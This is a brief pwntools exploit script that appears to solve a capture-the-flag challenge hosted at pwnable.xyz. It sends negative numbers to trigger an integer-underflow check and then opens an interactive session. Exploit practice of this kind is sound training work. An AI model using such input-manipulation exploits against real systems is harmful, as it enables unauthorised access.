#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF('challenge')
# context.log_level = "debug"
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(elf.path)
    else:
        return remote('svc.pwnable.xyz',30001) 
# ===========================
io = start()
# we could trigger integer overflow or use negative numbers
# so that the difference of the 2 arguments is 4919
io.sendline('-1')
io.sendline('-4920')
io.sendline('anything')
io.interactive()